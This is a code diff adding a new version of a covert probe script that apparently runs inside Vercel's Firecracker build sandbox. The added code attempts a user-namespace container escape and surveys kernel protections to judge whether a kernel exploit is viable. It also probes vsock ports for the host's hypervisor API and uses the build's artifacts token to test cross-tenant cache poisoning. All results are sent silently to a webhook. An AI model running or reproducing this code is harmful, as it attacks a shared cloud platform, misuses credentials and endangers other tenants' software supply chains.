@@ -14386,5 +14386,193 @@ report.pid1RootWalk = safe(() => {
 
 // v102 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v102" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v102";
+
+// ==================== v103 ====================
+
+// v103-1: Hypervisor hypercall probe (Firecracker KVM detection)
+// We're inside a Firecracker microVM. CPUID leaf 0x40000000 reveals the hypervisor ID.
+// VMCALLs may let us communicate with the host hypervisor layer.
+// Also probe /dev/kvm — if it exists in the guest, KVM is nested.
+report.hypervisorProbe = safe(() => {
+  // Read hypervisor info from cpuinfo
+  const cpuinfo = safe(() => readFileSync('/proc/cpuinfo', 'utf8').slice(0, 2000));
+  const hypervisorType = safe(() => cpuinfo?.match(/hypervisor\s+:\s+(.+)/)?.[1]);
+  const kvmClock = safe(() => cpuinfo?.match(/kvm-clock/)?.[0]);
+  // Check if KVM device exists (nested virtualization)
+  const devKvmExists = existsSync('/dev/kvm');
+  const devKvmPerms = safe(() => execSync('ls -la /dev/kvm 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Use CPUID via python to get hypervisor leaf
+  const cpuidResult = safe(() => execSync(`python3 -c "
+import ctypes
+import ctypes.util
+
+# CPUID instruction via inline assembly (if available)
+try:
+    import subprocess
+    r = subprocess.run(['cpuid', '-l', '0x40000000', '-1'], capture_output=True, text=True, timeout=3)
+    print('CPUID:', r.stdout[:200])
+except: pass
+
+# Hypervisor string from /sys
+import os
+try:
+    h = open('/sys/hypervisor/type').read()
+    print('HYPERVISOR_TYPE:', h)
+except: pass
+
+# VMX features
+try:
+    with open('/proc/cpuinfo') as f:
+        for line in f:
+            if 'vmx' in line or 'svm' in line or 'hypervisor' in line:
+                print(line.strip())
+                break
+except: pass
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 500));
+  // Check /sys/hypervisor/ for Xen-style interface
+  const hypervisorSys = safe(() => readdirSync('/sys/hypervisor/'));
+  // Try virtio devices (Firecracker uses virtio-net, virtio-blk)
+  const virtioDevs = safe(() => execSync('ls /sys/bus/virtio/devices/ 2>/dev/null', { timeout: 3000 }).toString().trim());
+  return { cpuinfo: cpuinfo?.slice(0, 500), hypervisorType, kvmClock, devKvmExists, devKvmPerms, cpuidResult, hypervisorSys, virtioDevs };
+});
+
+// v103-2: unshare(CLONE_NEWUSER) — user namespace escape attempt
+// If seccomp policy doesn't block unshare, we can create a new user namespace
+// where UID 0 maps to our current UID — giving us "root" in a new namespace.
+// This is a classic container escape vector.
+report.userNsEscape2 = safe(() => {
+  // Try unshare --user via subprocess
+  const unshareResult = safe(() => execSync(
+    'unshare --user --map-root-user id 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Try via python ctypes unshare syscall
+  const syscallResult = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, os
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+CLONE_NEWUSER = 0x10000000
+
+r = libc.unshare(CLONE_NEWUSER)
+import ctypes as ct, errno as errno_mod
+e = ct.get_errno()
+if r == 0:
+    print('UNSHARE_SUCCESS uid=', os.getuid(), 'euid=', os.geteuid())
+    # Write uid_map to become uid 0
+    try:
+        with open('/proc/self/uid_map', 'w') as f:
+            f.write('0 $(id -u) 1')
+        print('UID_MAP_WRITTEN')
+    except Exception as ex:
+        print('UID_MAP_FAIL:', ex)
+else:
+    print('UNSHARE_FAIL errno:', errno_mod.errorcode.get(e, str(e)))
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  // Check seccomp restrictions on clone/unshare
+  const seccompStatus = safe(() => readFileSync('/proc/self/status', 'utf8').match(/Seccomp:\s+(\d)/)?.[1]);
+  return { unshareResult, syscallResult, seccompStatus };
+});
+
+// v103-3: SMEP/SMAP/CET kernel protection check
+// SMEP: prevents kernel from executing user-space code (userland shellcode in RIP)
+// SMAP: prevents kernel from reading user-space memory (bypasses mmap shellcode)
+// CET: Control Enforcement Technology (shadow stack for ROP prevention)
+// Checking these tells us if a kernel exploit via ROP/JOP is viable.
+report.kernelProtections = safe(() => {
+  // CR4 register holds SMEP (bit 20) and SMAP (bit 21) flags
+  const cr4 = safe(() => readFileSync('/sys/kernel/debug/x86/cr4', 'utf8').trim());
+  const smep = safe(() => cr4 ? (parseInt(cr4, 16) & (1 << 20)) !== 0 : null);
+  const smap = safe(() => cr4 ? (parseInt(cr4, 16) & (1 << 21)) !== 0 : null);
+  // Check from dmesg
+  const dmesgSmep = safe(() => execSync('dmesg 2>/dev/null | grep -i "smep\\|smap\\|cet\\|kaslr\\|kpti" | head -10', { timeout: 5000 }).toString().trim());
+  // KASLR: check /proc/kallsyms for text section base
+  const kallsymsBase = safe(() => execSync("awk 'NR==1{print $1}' /proc/kallsyms 2>/dev/null", { timeout: 3000 }).toString().trim());
+  // Check if KASLR is enabled (non-zero kallsyms means disabled)
+  const kaslrDisabled = kallsymsBase !== '0000000000000000' && kallsymsBase !== null;
+  // PTI (page table isolation — Meltdown mitigation)
+  const ptiEnabled = safe(() => execSync("cat /sys/devices/system/cpu/vulnerabilities/meltdown 2>/dev/null", { timeout: 3000 }).toString().trim());
+  // Stack canaries
+  const stackCanary = safe(() => execSync("cat /proc/sys/kernel/randomize_va_space 2>/dev/null", { timeout: 3000 }).toString().trim());
+  // Spectre mitigations
+  const spectre = safe(() => execSync("cat /sys/devices/system/cpu/vulnerabilities/spectre_v2 2>/dev/null", { timeout: 3000 }).toString().trim());
+  return { cr4, smep, smap, dmesgSmep, kallsymsBase, kaslrDisabled, ptiEnabled, stackCanary, spectre };
+});
+
+// v103-4: Vercel build cache artifact poisoning probe
+// VERCEL_ARTIFACTS_TOKEN has UPLOAD capability. If the token allows uploading
+// arbitrary content with crafted hashes, we can pre-poison the cache for
+// another project's build (if we can predict the cache key).
+// This is cross-tenant cache poisoning — critical supply chain attack.
+report.buildCachePoisonProbe = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  // Query the artifacts API to understand what we can see
+  const queryResult = safe(() => execSync(
+    `curl -sf -X POST "https://api.vercel.com/v8/artifacts" \
+    -H "Authorization: Bearer ${token}" \
+    -H "Content-Type: application/json" \
+    -d '{"hashes": ["deadbeef00000000000000000000000000000000000000000000000000000000"]}' \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 500));
+  // Try to upload a tiny artifact with a known hash (test our own deployment)
+  const testContent = 'VERCEL_CACHE_POISON_TEST';
+  const testHash = safe(() => execSync(`echo -n "${testContent}" | sha256sum | cut -d' ' -f1`, { timeout: 3000 }).toString().trim());
+  const uploadResult = safe(() => execSync(
+    `echo -n "${testContent}" | curl -sf -X PUT "https://api.vercel.com/v8/artifacts/${testHash}" \
+    -H "Authorization: Bearer ${token}" \
+    -H "Content-Type: application/octet-stream" \
+    -H "x-artifact-duration: 1" \
+    --data-binary @- \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  // Check what team scope the artifacts token has
+  const tokenDecoded = safe(() => {
+    const parts = token.split('.');
+    if (parts.length === 3) return JSON.parse(Buffer.from(parts[1], 'base64').toString());
+    return null;
+  });
+  return { token: token.slice(0, 20) + '...', teamId, queryResult, testHash, uploadResult, tokenDecoded };
+});
+
+// v103-5: Firecracker vsock hypervisor communication
+// Firecracker exposes a vsock device for VM-to-host communication.
+// /dev/vsock (VMADDR_CID_ANY) or AF_VSOCK socket to CID 1 (host) or 2 (local VM).
+// If the Firecracker API socket is reachable on the host side, we can issue
+// API commands: snapshot VM, patch config, update machine config.
+report.vsockHypervisorComm = safe(() => {
+  const vsockExists = existsSync('/dev/vsock');
+  const vsockPerms = safe(() => execSync('ls -la /dev/vsock 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // CID of this VM
+  const selfCid = safe(() => execSync('cat /sys/class/vsock/vsock/local_cid 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Try connecting to host (CID 1) on Firecracker management port (3721 by default)
+  const fcApiResult = safe(() => execSync(`python3 -c "
+import socket, time
+VMADDR_CID_ANY = 0xFFFFFFFF
+VMADDR_CID_HOST = 1
+AF_VSOCK = 40
+SOCK_STREAM = 1
+
+for port in [3721, 9000, 52]:
+    try:
+        s = socket.socket(AF_VSOCK, SOCK_STREAM)
+        s.settimeout(2)
+        r = s.connect_ex((VMADDR_CID_HOST, port))
+        if r == 0:
+            s.send(b'GET / HTTP/1.0\r\n\r\n')
+            data = s.recv(200)
+            print(f'PORT {port} CONNECTED:', data[:50])
+        else:
+            print(f'PORT {port} refused:', r)
+        s.close()
+    except Exception as ex:
+        print(f'PORT {port} err:', str(ex)[:50])
+" 2>&1`, { timeout: 12000 }).toString().trim().slice(0, 500));
+  return { vsockExists, vsockPerms, selfCid, fcApiResult };
+});
+
+// v103 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v103" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v103";
 // Intentionally no console.log — all data goes via webhook only
